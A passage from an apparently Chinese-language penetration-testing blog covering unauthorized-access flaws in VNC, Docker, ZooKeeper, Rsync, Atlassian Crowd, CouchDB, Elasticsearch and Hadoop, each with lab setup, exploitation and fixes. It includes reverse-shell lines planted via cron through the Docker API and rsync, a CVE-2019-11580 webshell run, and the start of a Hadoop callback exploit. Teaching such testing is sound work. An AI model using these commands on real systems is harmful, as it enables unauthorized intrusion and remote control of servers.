class=\"line\">PIDFile=/root/.vnc/%H%i.pid</span><br><span class=\"line\">ExecStop=-/usr/bin/vncserver -kill %i</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>1、端口检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> netstat -ant | grep 5901</span></span><br><span class=\"line\">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN</span><br><span class=\"line\">tcp6       0      0 :::5901                 :::*                    LISTEN</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709155404841.png\" alt=\"image-20200709155404841\"></p>\n<p>2、取消鉴权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//先停掉服务</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> sudo vncserver -<span class=\"built_in\">kill</span> :1</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vncserver :1 -SecurityTypes=none</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709162439146.png\" alt=\"image-20200709162439146\"></p>\n<h5 id=\"漏洞修复-5\"><a href=\"#漏洞修复-5\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、添加用户认证</p>\n<p>2、以最小普通权限身份运行操作系统</p>\n<h4 id=\"Docker-未授权访问\"><a href=\"#Docker-未授权访问\" class=\"headerlink\" title=\"Docker 未授权访问\"></a>Docker 未授权访问</h4><h5 id=\"漏洞描述-6\"><a href=\"#漏洞描述-6\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p>\n<p>​        Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>\n<h5 id=\"漏洞验证-6\"><a href=\"#漏洞验证-6\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//pip安装</span><br><span class=\"line\">[root@localhost ~]# yum -y install epel-release</span><br><span class=\"line\">[root@localhost ~]# yum -y install python-pip</span><br><span class=\"line\">[root@localhost ~]# pip install --upgrade pip</span><br><span class=\"line\">[root@localhost ~]# pip install docker-compose</span><br><span class=\"line\">[root@localhost ~]# yum install docker</span><br><span class=\"line\">mkdir docker</span><br><span class=\"line\">cd docker </span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/Dockerfile</span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-compose.yml</span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-entrypoint.sh</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class=\"line\">ERROR: Couldn&#x27;t connect to Docker daemon at http+docker://localhost - is it running?</span><br><span class=\"line\"></span><br><span class=\"line\">If it&#x27;s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</span><br><span class=\"line\">//报以上报错因服务未启动</span><br><span class=\"line\">[root@localhost docker]# sudo systemctl start docker</span><br><span class=\"line\">//编译并启动</span><br><span class=\"line\">[root@localhost docker]# docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706155443054.png\" alt=\"image-20200706155443054\"></p>\n<p>1、未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;nmap端口检测</span><br><span class=\"line\">➜  Desktop sudo nmap -sS -p 1-65535 -v 172.16.144.135</span><br><span class=\"line\">&#x2F;&#x2F;获取远程docker信息</span><br><span class=\"line\">➜  Desktop docker -H tcp:&#x2F;&#x2F;172.16.144.135:2375 version</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706155712528.png\" alt=\"image-20200706155712528\"></p>\n<p>2、反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure>\n\n<p>启动容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -H tcp://172.16.144.135:2375 run -id -v /etc/crontabs:/tmp alpine:latest</span><br><span class=\"line\">//主要查看images id值</span><br><span class=\"line\">docker -H tcp://172.16.144.135:2375 ps</span><br><span class=\"line\">//进入进程shell</span><br><span class=\"line\">docker -H tcp://172.16.144.135:2375 exec -it fd986b9a93f2 sh\t\t//image id 必须本地拉取新的id值</span><br><span class=\"line\">//新建计划任务</span><br><span class=\"line\">echo &#x27;* * * * * /usr/bin/nc 172.16.144.135 9988 -e /bin/sh&#x27; &gt;&gt; /tmp/root</span><br><span class=\"line\">//获取计划任务信息列表</span><br><span class=\"line\">cat /tmp/root</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707103740566.png\" alt=\"image-20200707103740566\"></p>\n<p>反弹成功</p>\n<p><img src=\"/images/Unauthorized/image-20200707103806562.png\" alt=\"image-20200707103806562\"></p>\n<p>3、未授权访问检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//此脚本可以检测未授权访问漏洞，反弹shell未实验</span><br><span class=\"line\">https://github.com/Tycx2ry/docker_api_vul</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞修复-6\"><a href=\"#漏洞修复-6\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、2375端口做网络访问控制</p>\n<p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p>\n<h4 id=\"ZooKeeper-未授权访问\"><a href=\"#ZooKeeper-未授权访问\" class=\"headerlink\" title=\"ZooKeeper 未授权访问\"></a>ZooKeeper 未授权访问</h4><h5 id=\"漏洞描述-7\"><a href=\"#漏洞描述-7\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>\n<h5 id=\"漏洞验证-7\"><a href=\"#漏洞验证-7\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class=\"line\">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class=\"line\">cd zookeeper-3.4.14/conf</span><br><span class=\"line\">mv zoo_sample.cfg zoo.cfg</span><br><span class=\"line\">../bin/zkServer.sh start\t//服务启动</span><br><span class=\"line\">../bin/zkServer.sh stop\t  //服务停止</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707111251952.png\" alt=\"image-20200707111251952\"></p>\n<p>1、未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo envi|nc 172.16.144.135 2181</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707111357506.png\" alt=\"image-20200707111357506\"></p>\n<p>2、ZooKeeper可视化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;issues.apache.org&#x2F;jira&#x2F;secure&#x2F;attachment&#x2F;12436620&#x2F;ZooInspector.zip</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707111758244.png\" alt=\"image-20200707111758244\"></p>\n<p><img src=\"/images/Unauthorized/image-20200707112356764.png\" alt=\"image-20200707112356764\"></p>\n<h5 id=\"漏洞修复-7\"><a href=\"#漏洞修复-7\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、修改 ZooKeeper 默认端口，采用其他端口服务</p>\n<p>2、添加访问控制，配置服务来源地址限制策略</p>\n<p>3、增加 ZooKeeper 的认证配置</p>\n<h4 id=\"Rsync-未授权访问\"><a href=\"#Rsync-未授权访问\" class=\"headerlink\" title=\"Rsync 未授权访问\"></a>Rsync 未授权访问</h4><h5 id=\"漏洞描述-8\"><a href=\"#漏洞描述-8\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 <code>837</code>。</p>\n<h5 id=\"漏洞验证-8\"><a href=\"#漏洞验证-8\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//下载项目</span><br><span class=\"line\">https://github.com/vulhub/vulhub/tree/master/rsync/common</span><br><span class=\"line\">//启动容器</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker ps -a</span></span><br><span class=\"line\">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class=\"line\">5c1eb59de4a8        common_rsync        &quot;/docker-entrypoin...&quot;   13 seconds ago      Up 12 seconds       0.0.0.0:873-&gt;873/tcp   common_rsync_1</span><br></pre></td></tr></table></figure>\n\n<p>1、未授权检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> rsync rsync://&#123;target_ip&#125;/</span></span><br><span class=\"line\">➜  Downloads rsync rsync://172.16.144.135:873/</span><br><span class=\"line\">src            \tsrc path</span><br><span class=\"line\">//下载文件至本地</span><br><span class=\"line\">➜  Downloads rsync rsync://172.16.144.135:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>\n\n<p>2、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载crontab配置文件</span></span><br><span class=\"line\">rsync rsync://172.16.2.250:873/src/etc/crontab ./</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 该环境crontab中</span></span><br><span class=\"line\">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class=\"line\">表示每小时的第17分钟执行run-parts --report /etc/cron.hourly</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 写入bash并赋权</span></span><br><span class=\"line\">vim nc</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/172.16.144.135/9999 0&gt;&amp;1</span><br><span class=\"line\">chmod 777 nc</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 将文件上传至/etc/cron.hourly</span></span><br><span class=\"line\">rsync -av nc rsync://172.16.144.135:873/src/etc/cron.hourly</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707115044398.png\" alt=\"image-20200707115044398\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 本地监听9999</span></span><br><span class=\"line\">nc -lnvp 9999</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707121738127.png\" alt=\"image-20200707121738127\"></p>\n<h5 id=\"漏洞修复-8\"><a href=\"#漏洞修复-8\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、账户认证：正确配置认证用户名及密码</p>\n<p>2、权限控制：使用合理的权限</p>\n<p>3、网络访问控制：控制接入源ip</p>\n<p>4、数据加密传输等</p>\n<h4 id=\"Atlassian-Crowd-未授权访问\"><a href=\"#Atlassian-Crowd-未授权访问\" class=\"headerlink\" title=\"Atlassian Crowd 未授权访问\"></a>Atlassian Crowd 未授权访问</h4><h5 id=\"漏洞描述-9\"><a href=\"#漏洞描述-9\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。</p>\n<h5 id=\"漏洞验证-9\"><a href=\"#漏洞验证-9\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip</span><br><span class=\"line\">unzip atlassian-crowd-3.4.3.zip</span><br><span class=\"line\">cd atlassian-crowd-3.4.3</span><br><span class=\"line\">vim crowd-webapp/WEB-INF/classes/crowd-init.properties</span><br><span class=\"line\">//取消注释</span><br><span class=\"line\">crowd.home=/var/crowd-home</span><br></pre></td></tr></table></figure>\n\n<p>执行“Set up Crowd”</p>\n<p><img src=\"/images/Unauthorized/image-20200708113709624.png\" alt=\"image-20200708113709624\"></p>\n<p>申请30天试用<a href=\"https://my.atlassian.com/products/index\">license</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://my.atlassian.com/license/evaluation?utm_nooverride=1&amp;product=Crowd&amp;version=3.4.3&amp;sid=Server ID&amp;ref=prod</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200708120448211.png\" alt=\"image-20200708120448211\"></p>\n<p>如下图所示：安装成功</p>\n<p><img src=\"/images/Unauthorized/image-20200708133857021.png\" alt=\"image-20200708133857021\"></p>\n<p>1、未授权测试</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  Atlassian git clone https://github.com/jas502n/CVE-2019-11580.git</span><br><span class=\"line\">➜  CVE-2019-11580 git:(master) sudo python CVE-2019-11580.py http://172.16.144.135:8095/</span><br><span class=\"line\">http://172.16.144.135:8095//crowd/admin/uploadplugin.action</span><br><span class=\"line\"></span><br><span class=\"line\">Installed plugin /root/atlassian-crowd-3.4.3/apache-tomcat/temp/plugindev-3858334950456985130rce.jar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt;&gt;Get Webshell\t\t\t//已经getshell</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://172.16.144.135:8095//crowd/plugins/servlet/exp?cmd=whoami</span><br><span class=\"line\"></span><br><span class=\"line\">Exec command= whoami</span><br><span class=\"line\"></span><br><span class=\"line\">Result= root</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200708134835246.png\" alt=\"image-20200708134835246\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  CVE-2019-11580 git:(master) curl http://172.16.144.135:8095//crowd/plugins/servlet/exp\\?cmd\\=id</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞修复-9\"><a href=\"#漏洞修复-9\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、设置访问/crowd/admin/uploadplugin.action的源ip</p>\n<p>2、版本升级</p>\n<h4 id=\"CouchDB-未授权访问\"><a href=\"#CouchDB-未授权访问\" class=\"headerlink\" title=\"CouchDB 未授权访问\"></a>CouchDB 未授权访问</h4><h5 id=\"漏洞描述-10\"><a href=\"#漏洞描述-10\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,默认会在<code>5984</code>端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>\n<p>​    在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生</p>\n<h5 id=\"漏洞验证-10\"><a href=\"#漏洞验证-10\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> mkdir couchdb</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/docker-compose.yml</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709010005589.png\" alt=\"image-20200709010005589\"></p>\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://127.0.0.1:5984</span><br><span class=\"line\">curl http://127.0.0.1:5984/_config</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709005955776.png\" alt=\"image-20200709005955776\"></p>\n<p><img src=\"/images/Unauthorized/image-20200709010449342.png\" alt=\"image-20200709010449342\"></p>\n<h5 id=\"漏洞修复-10\"><a href=\"#漏洞修复-10\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、添加认证入口</p>\n<h4 id=\"Elasticsearch-未授权访问\"><a href=\"#Elasticsearch-未授权访问\" class=\"headerlink\" title=\"Elasticsearch 未授权访问\"></a>Elasticsearch 未授权访问</h4><h5 id=\"漏洞描述-11\"><a href=\"#漏洞描述-11\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。<br>  Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。</p>\n<h5 id=\"漏洞验证-11\"><a href=\"#漏洞验证-11\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ElasticSearch必须jdk8</span><br><span class=\"line\">//新建用户</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> useradd elasticsearch</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> passwd elasticsearch</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> su elasticsearch</span></span><br><span class=\"line\">[elasticsearch@localhost ~]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip elasticsearch-5.5.0.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> /elasticsearch-5.5.0/bin</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./elasticsearch -d</span></span><br></pre></td></tr></table></figure>\n\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> curl  127.0.0.1:9200</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200708235939239.png\" alt=\"image-20200708235939239\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> curl http://172.16.144.135:9200/_nodes</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709002204225.png\" alt=\"image-20200709002204225\"></p>\n<h5 id=\"漏洞修复-11\"><a href=\"#漏洞修复-11\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、访问控制策略，限制IP访问，绑定固定IP</p>\n<p>2、在config/elasticsearch.yml中为9200端口设置认证等</p>\n<h4 id=\"Hadoop-未授权访问\"><a href=\"#Hadoop-未授权访问\" class=\"headerlink\" title=\"Hadoop 未授权访问\"></a>Hadoop 未授权访问</h4><h5 id=\"漏洞描述-12\"><a href=\"#漏洞描述-12\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>\n<p>​        Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>\n<h5 id=\"漏洞验证-12\"><a href=\"#漏洞验证-12\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//拉取docker-compose</span><br><span class=\"line\">mkdir hadoop</span><br><span class=\"line\">cd hadoop/</span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/docker-compose.yml</span><br><span class=\"line\">//编译并启动</span><br><span class=\"line\">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8088/cluster</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709140307458.png\" alt=\"image-20200709140307458\"></p>\n<p>2 、命令执行</p>\n<p>本地监听端口，并执行以下exp脚本。</p>\n<p>exp.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">target = <span class=\"string\">&#x27;http://192.168.18.129:8088/&#x27;</span></span><br><span class=\"line\">lhost = <span class=\"string\">&#x27;192.168.18.138&#x27;</span> <span class=\"comment\"># put your local host ip here, and listen at port 9999</span></span><br><span class=\"line\"></span><br><span class=\"line\">url = target + 